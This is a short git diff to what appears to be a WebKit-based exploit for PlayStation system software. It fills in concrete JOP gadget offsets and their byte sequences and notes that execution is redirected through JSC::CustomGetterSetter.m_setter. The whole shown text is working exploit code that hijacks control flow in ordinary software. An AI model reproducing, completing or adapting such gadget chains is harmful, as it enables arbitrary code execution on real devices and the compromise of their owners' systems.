@@ -37,7 +37,7 @@ export let libkernel_base = null;
 // libSceLibcInternal.sprx
 export let libc_base = null;
 
-// TODO: gadgets for the JOP chain
+// gadgets for the JOP chain
 //
 // we'll use JSC::CustomGetterSetter.m_setter to redirect execution. its
 // type is PutPropertySlot::PutValueFunc
@@ -61,7 +61,6 @@ call qword ptr [rax + 0x40]
 `;
 const jop4 = `
 push rdx
-mov edi, 0xac9784fe
 jmp qword ptr [rax]
 `;
 const jop5 = "pop rsp; ret";
@@ -109,11 +108,11 @@ const webkit_gadget_offsets = new Map(
     "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
     "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
 
-    [jop1]: 0x0000000000000000, // ``
-    [jop2]: 0x0000000000000000, // ``
-    [jop3]: 0x0000000000000000, // ``
-    [jop4]: 0x0000000000000000, // ``
-    [jop5]: 0x0000000000000000, // ``
+    [jop1]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
+    [jop2]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
+    [jop3]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
+    [jop4]: 0x00000000021f3a2e, // `52 ff 20`
+    [jop5]: 0x0000000000073c2b, // `5c c3`
   }),
 );
 
